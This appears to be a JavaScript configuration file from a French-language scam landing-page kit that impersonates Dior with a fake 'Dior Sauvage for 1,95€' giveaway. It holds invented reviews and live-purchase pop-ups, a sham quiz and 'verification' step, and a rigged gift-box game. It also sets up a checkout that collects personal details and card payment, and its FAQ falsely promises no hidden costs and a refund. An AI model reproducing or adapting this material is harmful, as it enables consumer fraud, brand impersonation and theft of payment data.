const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

(function (exp) {
  const countryCode = "fr";
  const lang = "fr-FR";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Taille : ",
    arr: ["XS", "S", "M", "M/L", "L", "L/XL", "XL", "XXL"],
  };

  // I FILL THIS INFO IN MAIN.JS
  const mainProduct = {
    header: "",
    name: "Félicitations ! Vous pouvez participer à la promotion Dior Sauvage 100ml !",
    oldPrice: "",
    newPrice: "",
    selectText: "",
    text: "Félicitations! <br><br> Vous pouvez participer à la promotion Dior Sauvage 100ml! <br><br> Dior vend ses derniers parfums Sauvage pour seulement 1,95€ après avoir cessé ses activités en Europe de l'Est. Grâce à la nouvelle stratégie de campagne, chaque Français peut obtenir aujourd'hui 1 des 1000 parfums🎁.<br><br> Pour recevoir un Sauvage de Dior, veuillez remplir le formulaire pour confirmer que vous êtes une personne réelle. <br><br> Dépêchez-vous, le nombre d'articles proposés est limité!",
  };

  const notifications = [
    {
      user: "Béatrice Lameny",
      location: "Paris, France",
      action: "Je viens d'acheter Dior Sauvage 100ml pour 1.95€!",
      timeago: "Il y a 15 secondes",
    },
    {
      user: "Tracey B***",
      location: "Lyon, France",
      action: "Je viens d'acheter Dior Sauvage 100ml pour 1.95€!",
      timeago: "Il y a 25 secondes",
    },
  ];

  const reviewsArr = [
    {
      name: "Jean-Pierre Dubourg",
      time: "Il y a 1 jour",
      header: "C'est incroyable !",
      product: "26468782",
      image: "./assets/proof1.jpg",
      review: "J'ai récemment entendu parler de cette promotion et j'ai décidé de l'acheter. Merci Dior pour la vente!.",
    },
    {
      name: "Philou Filou",
      time: "Il y a 2 jours",
      header: "Fantastique ! Je suis sans voix.",
      product: "26468789",
      image: "./assets/proof2.jpeg",
      review: "Je vous remercie. Le colis a été livré très rapidement",
    },
    {
      name: "Irice Appert",
      time: "Il y a 2 jours",
      header: "Tout simplement génial.",
      product: "26468783",
      image: "./assets/proof3.jpg",
      review: "Mon mari ne voulait pas que je participe car nous n'avions pas entendu parler de cette vente, mais lorsque mon colis est arrivé, il était très enthousiaste.",
    },
    {
      name: "Pierrick Josien",
      time: "Il y a 4 jours",
      header: "Je l'adore.",
      image: "./assets/proof4.jpg",
      review: "Je voulais ces parfums depuis longtemps et j'en ai enfin un.",
    },
    {
      name: "Marc Duquesne",
      time: "Il y a 7 jours",
      header: "Wow, je suis absolument ravi de ce produit !",
      product: "26468784",
      image: "./assets/proof5.jpg",
      review: "Incroyable. Parfum cher et de qualité pour seulement 1,95€. Je vous remercie!",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "AVIS ET NOTES",
    percent: "99%",
    rec: "Commentaires sur cette action",
  };

  const questions = {
    _of: "Question {1} sur {2} : ",
    arr: [
      {
        q: "Avez-vous déjà porté Dior Sauvage?",
        a: ["Oui", "Non"],
      },
      {
        q: "Où avez-vous trouvé cette phrase?",
        a: ["Sur le site officiel", "Publicités Facebook", "Transmis par un ami"],
      },
      {
        q: "Dans quel but utiliserez-vous un Dior Sauvage?",
        a: ["Pour un cadeau", "Pour usage personnel"],
      },
    ],
  };

  const check = {
    title: "Vos réponses sont en cours de vérification.",
    secondTitle: "Chargement...",
    arr: [
      "Vous avez répondu à la question 3/3",
      "Aucune étude préliminaire de votre IP.",
      "Les cadeaux se chargent...",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Félicitations, vous avez vérifié avec succès que vous êtes une personne réelle.",
        button: "OK",
        text: `
      <center>
      Aujourd'hui, {date}, vous avez la possibilité d'obtenir votre Dior Sauvage 100ml.
        <br><br>
        Il vous suffit de choisir le bon coffret cadeau.
        <br><br>
        Vous avez 3 possibilités, bonne chance!
      </center>
    `,
      },
    },
    first: {
      texts: {
        header: "Oh non...",
        button: "OK",
        text: `
      <center>
      Désolé, mais ce cadeau est vide ! Il vous reste 2 tentatives. Bonne chance !
      </center>
    `,
      },
    },
    win: {
      texts: {
        header: `Félicitations! Vous avez gagné!`,
        button: "OK",
        text: `
      <center>
        <p style="color: #b51817">
        Vous avez gagné le Dior Sauvage 100ml!
        </p>
        <br>
        1) Cliquez sur "OK" ci-dessous pour accéder à la page de paiement de l'expédition.
         <br><br>
        2) Remplissez le formulaire et payez votre commande pour recevoir votre Dior Sauvage.
        <br><br>
        3) Le colis sera livré dans les 5 à 7 jours.
      </center>
    `,
      },
    },
  };

  const faqs = [
    {
      question: "Combien de temps devrai-je attendre pour mon prix ?",
      answer: "Cela prend généralement 5 à 7 jours ouvrables.",
    },
    {
      question: "Y a-t-il des coûts cachés ?",
      answer: "Absolument pas. Une fois que vous avez gagné votre prix et entré vos coordonnées, nous nous occupons du reste. Les frais de port sont à notre charge !",
    },
    {
      question: "Je suis gagnant, pourquoi devrais-je répondre aux questions/deviner la boîte ?",
      answer: "Vous n'êtes pas encore gagnant, mais vous faites partie des 10 personnes sélectionnées pour tenter de remporter notre prix...",
    },
    {
      question: "Comment puis-je obtenir un prix si je gagne ?",
      answer: "Tout d'abord, vous devez entrer votre adresse de livraison et vos coordonnées, puis notre système vous dirigera. Ensuite, vous devez prouver que vous n'êtes pas un robot, car le prix n'est offert qu'à de vraies personnes.",
    },
    {
      question: "Pourquoi devrais-je payer 1,95 € pour un prix ?",
      answer: "1,95 € n'est pas un prix - c'est un paiement à l'avance pour prouver que vous êtes bien humain. Tous les paiements seront remboursés une fois approuvés.",
    },
    {
      question: "Je ne peux pas utiliser ma carte de crédit, transaction échouée ?",
      answer: "Si vous ne pouvez pas utiliser votre carte de crédit, votre banque bloque la transaction : vous devez vérifier votre compte bancaire.",
    },
  ];

  const cartSteps = {
    personal: {
      title: "Informations personnelles",
      fields: {
        name: {
          enabled: true,
          field: "Prénom",
        },
        family: {
          enabled: true,
          field: "Nom de famille",
        },
        phone: {
          enabled: true,
          field: "Numéro de téléphone",
        },
        email: {
          enabled: true,
          field: "E-mail",
        },
      },
    },
    delivery: {
      title: "Livraison",
      fields: {
        city: {
          enabled: true,
          field: "Ville",
        },
        address: {
          enabled: true,
          field: "Adresse de livraison",
        },
        zip: {
          enabled: true,
          field: "Code postal",
        },
      },
    },
    payment: {
      title: "Modes de paiement",
      creditCard: "Paiement en ligne par carte de crédit",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Récapitulatif de la commande",
      oldPrice: "",
      newPrice: "1,95 €",
      size: "Taille",
      subTotal: {
        title: "Valeur de la commande",
        amount: "1,95 €",
      },
      delivery: {
        title: "Livraison",
        amount: "0,00 €",
      },
      total: {
        title: "Total",
        amount: "1,95 €",
      },
      checkoutButton: "Payez votre commande",
    },
  };

  const products = [
    {
      id: "26468782",
      name: "Dior Sauvage 100ml",
      miniImg: "./assets/slide_1.png",

      images: [
        "./assets/slide_1.png",
        "./assets/slide_2.png",
        "./assets/slide_3.jpg",
        "./assets/slide_4.jpg",
      ],
    },
  ];


  const footer = {
    cr: "© 2024 DIOR. All rights reserved.",
  };


  const pathImgBox = {
    lid: "./assets/box-lid.png",
    lidIOs: "./assets/box-lid-ios.png",
    inner: "./assets/box-inner.png",
    innerGift: "./assets/box-inner-gift.png",
    box: "./assets/box.png",
    boxModal: "./assets/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
    faqs,
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");

  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }

  return products.find((pr) => pr.id === ind);
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) =>
  localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader_container");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {

  const loader = document.querySelector(".loader_container");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");

};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};
